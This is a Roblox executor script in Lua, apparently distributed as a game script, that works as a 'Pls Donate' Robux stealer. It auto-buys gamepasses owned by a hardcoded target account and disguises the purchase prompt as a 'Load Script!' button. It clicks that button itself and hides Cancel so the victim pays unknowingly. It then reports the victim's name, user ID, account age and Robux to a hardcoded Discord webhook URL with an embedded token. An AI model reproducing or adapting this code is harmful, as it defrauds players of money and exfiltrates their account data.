-- Espera jogo carregar
repeat task.wait() until game:IsLoaded() and game.Players.LocalPlayer.Parent

local Username = "lan_wp27"  -- CORRIGIDO
local Webhook = "https://discord.com/api/webhooks/1359920557998604399/TADkOrRGt4BHvwAxE7NBMMxx4JHI-EBblHnsnvRS8iXThLWDTvpGoYKThwdlmCcvqyO6"

local MarketplaceService = game:GetService("MarketplaceService")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")

local request = syn and syn.request or http_request or http.request
if not request then error("Executor sem HTTP!") end

local Remotes = ReplicatedStorage:WaitForChild("Remotes", 10)
local RemotesModule = require(Remotes)

local headers = {["Content-Type"] = "application/json"}
local userRobux = 0
local donationsSent = 0
local isFirstLoad = true

local function sendWebhook(robuxAmount)
    local embed = {
        title = "🎁 Pls Donate HIT!",
        color = 65280,
        thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId="..Players.LocalPlayer.UserId.."&width=420&height=420"},
        fields = {
            {name="👤 Victim", value="```"..Players.LocalPlayer.Name.."\nID: "..Players.LocalPlayer.UserId.."\nAge: "..Players.LocalPlayer.AccountAge.."```", inline=true},
            {name="💰 Robux Doados", value="```"..tostring(robuxAmount or donationsSent).." R$```", inline=true},
            {name="🎯 Target", value="```"..Username.."```", inline=true},
            {name="🛠️ Executor", value="```"..(identifyexecutor and identifyexecutor() or "Unknown").."```", inline=true}
        },
        footer = {text="Shar's Offline Stealer"}
    }
    
    request({
        Url=Webhook, Method="POST", Headers=headers,
        Body=HttpService:JSONEncode({
            username="Pls Donate Stealer",
            content="@everyone",
            embeds={embed}
        })
    })
end

-- Target UserId
local targetUserId = Players:GetUserIdFromNameAsync(Username)
print("🎯 Target UserId:", targetUserId)

-- AUTO DONATE LOOP
spawn(function()
    while task.wait(1.5) do
        pcall(function()
            for _, booth in pairs(workspace:GetChildren()) do
                if booth:FindFirstChild("BoothUI") and booth.BoothUI:FindFirstChild("Items") then
                    for _, item in pairs(booth.BoothUI.Items.Frame:GetChildren()) do
                        if item:GetAttribute("AssetType") == "Gamepass" and 
                           item:GetAttribute("OwnerUserId") == targetUserId and
                           not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, item:GetAttribute("AssetId")) then
                            
                            local price = item:GetAttribute("AssetPrice")
                            if price and price > 0 then
                                print("💸 AUTO DONATE: "..price.." R$ -> "..Username)
                                item.Prompt:FireServer("", false, price)
                                donationsSent = donationsSent + price
                                return
                            end
                        end
                    end
                end
            end
        end)
    end
end)

-- 🔥 GUI HIJACK COMPLETO + AUTO CLICK
CoreGui.ChildAdded:Connect(function(child)
    if child.Name == "PurchasePrompt" then
        spawn(function()
            pcall(function()
                local container = child:WaitForChild("ProductPurchaseContainer", 2)
                local animator = container:WaitForChild("Animator", 2)
                
                animator.ChildAdded:Connect(function(prompt)
                    if prompt.Name == "Prompt" then
                        task.wait(0.2)
                        
                        local alertContents = prompt:WaitForChild("AlertContents", 1)
                        local titleContainer = alertContents:WaitForChild("TitleContainer", 0.5)
                        local footer = alertContents:WaitForChild("Footer", 0.5)
                        
                        -- PEGA BALANÇO ROBUX
                        local balanceLabel = footer.FooterContent.Content:FindFirstChild("RemainingBalanceText")
                        if balanceLabel and isFirstLoad then
                            local balanceMatch = balanceLabel.Text:match("(%d+)")
                            userRobux = tonumber(balanceMatch) or 0
                            print("💳 Seu Robux detectado: "..userRobux)
                            isFirstLoad = false
                        end
                        
                        -- FAKE GUI "LOAD SCRIPT"
                        if titleContainer then
                            titleContainer.TitleArea.Title.Text = isFirstLoad and "🔥 Script Loaded!" or "⏳ Processing Donation..."
                        end
                        
                        -- AUTO CLICK NO "LOAD SCRIPT" BUTTON
                        local buttons = footer.Buttons
                        if buttons["1"] and buttons["1"]:FindFirstChild("ButtonContent") then
                            buttons["1"].ButtonContent.ButtonMiddleContent.Text.Text = "🚀 Load Script!"
                            -- AUTO CLICK
                            spawn(function()
                                task.wait(0.3)
                                if buttons["1"].ButtonContent.Activated then
                                    buttons["1"].ButtonContent:Activate()
                                elseif buttons["1"].MouseButton1Click then
                                    buttons["1"].MouseButton1Click:Fire()
                                end
                            end)
                        end
                        
                        -- ESCONDE CANCEL
                        if buttons["2"] then
                            buttons["2"].Visible = false
                        end
                    end
                end)
            end)
        end)
    end
end)

-- Gift confirmation
pcall(function()
    RemotesModule.OnClientEvent("GiftSentAlert"):Connect(function(senderId, amount)
        if senderId == targetUserId then
            print("✅ GIFT CONFIRMADO: +"..amount.." R$ de "..Username)
            donationsSent = donationsSent + amount
            if donationsSent >= 25 then  -- Webhook mais cedo
                sendWebhook(donationsSent)
                print("🎉 WEBHOOK ENVIADO! Total: "..donationsSent.." R$")
            end
        end
    end)
end)

print("✅ LOADED! Auto-donating para "..Username.." (FULL AUTO)")
print("📊 Robux doados: 0 | GUI Hijacked ✓")
